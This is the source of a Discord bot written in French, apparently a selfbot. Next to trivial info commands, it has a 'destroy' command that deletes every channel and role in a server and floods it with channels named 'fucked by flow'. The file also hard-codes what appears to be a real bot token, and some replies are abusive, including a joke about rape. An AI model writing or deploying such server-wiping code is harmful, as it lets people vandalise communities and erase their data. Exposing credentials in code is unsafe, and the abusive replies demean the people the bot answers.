const Discord = require('discord.js');
const client = new Discord.Client();

var prefix = '.';
var token = 'NTAzNDY5NTAyODg1OTIwNzg1.DwdsNA.4gVNugXvpoaogsdNyeQf7NExB5c'

client.login(token)

client.on('ready' , function() {
	client.user.setActivity("Coder | FlowPlasma ☬", {type: "STREAMING"});
	console.log(`prêt ${client.user.tag} bro`)
});

client.on('message', message => {
	if(message.content === "flow"){
		message.reply("ntm slp");
		message.delete()
	}
});

client.on('message', message => {
	if(message.content === "destroy"){
		message.guild.channels.deleteAll("destroyer by flow");
		message.guild.roles.deleteAll("bot by flow");
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'text')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.guild.createChannel('fucked by flow', 'voice')
		message.delete();
		console.log("ez")
	}
});

client.on('message',function(message){
	if(message.content.includes(prefix + 'stop')){
		message.channel.send(` **au revoir les gars :cry:**`)
		message.delete().then(client.destroy())
	}
});

client.on('message' , message =>{
	if(message.content === "tu fais quoi ?"){
		message.reply('je te viole :sueur:');
		message.delete()
		console.log('un fdp Vien de se faire violer');
	}
});

client.on('message', message => {
	if(message.content === prefix + "cree"){
		message.channel.send(`cree le : ${message.author.createdAt} !`)
		message.delete();
		console.log("quelq'un a demandé le jour de la création de son compte !")
	}
});

client.on('message', message => {
	if(message.content === prefix + "avatar"){
		message.channel.send(`Ton avatar ${message.author.avatarURL} ! `)
		message.delete()
		console.log("+1 avatar donné")
	}
});

client.on('message', message => {
	if(message.content === prefix + "help"){
			    var help = new Discord.RichEmbed()
					  .setTitle("Commande")
					  .setDescription("Commandes du selfbot")
					  .addField(".cree","affiche la date de creation de ton compte !", true)
					  .addField(".avatar","affiche votre avatar quand vous executer la commande !", true)
					  .addField(".imgsrv","affiche l icône de votre serveur !", true)
					  .addField(".membres","affiche le nombre dans votre serveur !", true)
				message.channel.sendEmbed(help);
				message.delete();
		console.log(` ${message.author} a exécuté la commande de help ! `)
	}
});

client.on('message', message => {
	if(message.content === prefix + "imgsrv"){
		message.channel.send(`icone du serveur ! ${message.guild.iconURL} !`)
		message.delete()
		console.log("ok frr")
	}
});

client.on('message', message => {
	if(message.content === prefix + "membres"){
		message.channel.send(`Il y a ${message.guild.memberCount} personnes ! :tada:`)
		message.delete()
		console.log(`${message.author.username} a exécuté la commande : . membres`)
	}
});

client.on('message', message => {
	if(message.content === prefix + "flow"){
		message.channel.send("Flow est le fils de kais le gros porc")
		console.log("pas d'idée bro")
	}
});

client.on('message', message => {
	if(message.content === prefix + "leave"){
		message.guild.leave();
		console.log("j'ai quitté un serveur.")
	}
});

client.on('message', message => {
	if(message.content === prefix + "infosrv"){
		var servIcon = message.guild.iconURL;
		var servEmbed = new Discord.RichEmbed()
	.setDescription("Info du serveur")
	.setThumbnail(servIcon)
	.addField('Nom du serveur', message.guild.name)
	.addField('Nombre de membres', message.guild.memberCount)
	.addField('Crée le', message.guild.createdAt)
	.addField('Rejoins le', message.author.joinedAt)
	
	return message.channel.send(servEmbed);
	}
});
